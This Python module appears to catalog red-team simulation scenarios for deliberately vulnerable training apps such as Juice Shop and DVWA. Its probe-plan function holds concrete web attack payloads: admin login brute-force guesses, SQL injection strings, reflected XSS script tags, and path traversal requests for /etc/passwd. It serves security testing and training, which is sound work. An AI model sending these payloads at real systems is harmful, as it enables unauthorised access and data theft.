"""Curated Red-agent scenario catalog.

These scenarios are bounded, local-only simulations. They do not permit free
form commands or arbitrary remote targeting.

TODO:
- Add richer per-template scenario mappings as the target catalog expands.
- Add replay fixtures for deterministic evaluation runs.
"""

from __future__ import annotations

from typing import Optional

from ...red_agent_models import AttackScenario
from ...vulnerable_apps_models import SupportedTemplate


SCENARIO_CATALOG = [
    AttackScenario(
        scenario_id="login_bruteforce",
        display_name="Login Brute-Force Simulation",
        description="Send a bounded burst of login attempts to the selected local target.",
        notes="Operator-only simulation against the chosen platform-managed target.",
    ),
    AttackScenario(
        scenario_id="sql_injection_probe",
        display_name="SQL Injection Probe",
        description="Send a small set of injection-style probes to search or login endpoints.",
    ),
    AttackScenario(
        scenario_id="xss_probe",
        display_name="XSS Probe",
        description="Send a small set of reflected-input probes appropriate for local web targets.",
    ),
    AttackScenario(
        scenario_id="path_traversal_probe",
        display_name="Path Traversal Probe",
        description="Send a bounded set of path traversal probes against local file-oriented routes.",
    ),
]


def get_scenario_catalog() -> list[AttackScenario]:
    return list(SCENARIO_CATALOG)


def get_scenario(scenario_id: str) -> Optional[AttackScenario]:
    return next((scenario for scenario in SCENARIO_CATALOG if scenario.scenario_id == scenario_id), None)


def build_probe_plan(template_id: SupportedTemplate, scenario_id: str) -> list[dict[str, object]]:
    """Return a bounded list of HTTP probes for a scenario/template pair."""
    if scenario_id == "login_bruteforce":
        if template_id == SupportedTemplate.JUICE_SHOP:
            return [
                {"method": "POST", "path": "/rest/user/login", "body": {"email": "admin@juice-sh.op", "password": "guess1"}},
                {"method": "POST", "path": "/rest/user/login", "body": {"email": "admin@juice-sh.op", "password": "guess2"}},
                {"method": "POST", "path": "/rest/user/login", "body": {"email": "admin@juice-sh.op", "password": "guess3"}},
            ]
        if template_id == SupportedTemplate.DVWA:
            return [
                {"method": "GET", "path": "/login.php"},
                {"method": "GET", "path": "/login.php?username=admin&password=guess1&Login=Login"},
                {"method": "GET", "path": "/login.php?username=admin&password=guess2&Login=Login"},
            ]
        return [
            {"method": "POST", "path": "/identity/api/auth/login", "body": {"email": "operator@example.local", "password": "guess1"}},
            {"method": "POST", "path": "/identity/api/auth/login", "body": {"email": "operator@example.local", "password": "guess2"}},
        ]

    if scenario_id == "sql_injection_probe":
        if template_id == SupportedTemplate.JUICE_SHOP:
            return [
                {"method": "GET", "path": "/rest/products/search?q=' OR 1=1--"},
                {"method": "GET", "path": "/rest/products/search?q=%27%20UNION%20SELECT"},
            ]
        if template_id == SupportedTemplate.DVWA:
            return [
                {"method": "GET", "path": "/vulnerabilities/sqli/?id=1%27%20or%201=1--&Submit=Submit"},
            ]
        return [
            {"method": "GET", "path": "/identity/api/auth/login?email=' OR 1=1--"},
            {"method": "GET", "path": "/workshop/api/shop/products?query=' OR 1=1--"},
        ]

    if scenario_id == "xss_probe":
        if template_id == SupportedTemplate.JUICE_SHOP:
            return [
                {"method": "GET", "path": "/#/search?q=%3Cscript%3Ealert(1)%3C/script%3E"},
            ]
        if template_id == SupportedTemplate.DVWA:
            return [
                {"method": "GET", "path": "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E"},
            ]
        return [
            {"method": "GET", "path": "/workshop/api/support/tickets?message=%3Cscript%3Ealert(1)%3C/script%3E"},
        ]

    if scenario_id == "path_traversal_probe":
        if template_id == SupportedTemplate.JUICE_SHOP:
            return [
                {"method": "GET", "path": "/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd"},
            ]
        if template_id == SupportedTemplate.DVWA:
            return [
                {"method": "GET", "path": "/vulnerabilities/fi/?page=../../../../etc/passwd"},
            ]
        return [
            {"method": "GET", "path": "/workshop/api/documents/../../../../etc/passwd"},
        ]

    return []
